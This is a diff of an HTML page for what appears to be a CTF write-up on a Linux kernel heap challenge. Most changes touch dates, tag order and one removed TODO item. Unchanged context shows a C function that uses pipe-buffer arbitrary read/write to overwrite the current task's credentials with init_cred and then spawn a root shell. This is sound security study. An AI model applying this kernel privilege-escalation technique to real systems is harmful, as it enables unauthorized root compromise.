@@ -57,10 +57,10 @@
 <meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack.png">
 <meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack2.png">
 <meta property="article:published_time" content="2023-11-30T07:13:13.000Z">
-<meta property="article:modified_time" content="2023-12-05T16:38:14.839Z">
+<meta property="article:modified_time" content="2024-01-04T11:39:20.813Z">
 <meta property="article:author" content="Eurus">
-<meta property="article:tag" content="kernel">
 <meta property="article:tag" content="wp">
+<meta property="article:tag" content="kernel">
 <meta property="article:tag" content="Heap">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/wjx.jpg">
@@ -229,7 +229,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-06 00:38:14" itemprop="dateModified" datetime="2023-12-06T00:38:14+08:00">2023-12-06</time>
+                <time title="Modified: 2024-01-04 19:39:20" itemprop="dateModified" datetime="2024-01-04T19:39:20+08:00">2024-01-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -624,8 +624,6 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief find the init_task and copy something to current task_struct</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init_task = kernel_offset + INIT_TASK;</span><br><span class="line">    init_cred = kernel_offset + INIT_CRED;</span><br><span class="line">    init_nsproxy = kernel_offset + INIT_NSPROXY;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> current_task_page_1 = direct_map_addr_to_page_addr(current_task + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page_1), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">367</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">368</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">381</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page_1,</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul>
-<li><p>pipe_buffer自己写自己这种骚操作可行🐎</p>
-</li>
 <li><p>KASLR机制，物理内存探测和映射什么的（其实就是继续系统启动，乐）</p>
 </li>
 <li><p>What is CFI?</p>
@@ -640,8 +638,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/kernel/" rel="tag"># kernel</a>
               <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
               <a href="/tags/Heap/" rel="tag"># Heap</a>
           </div>
 
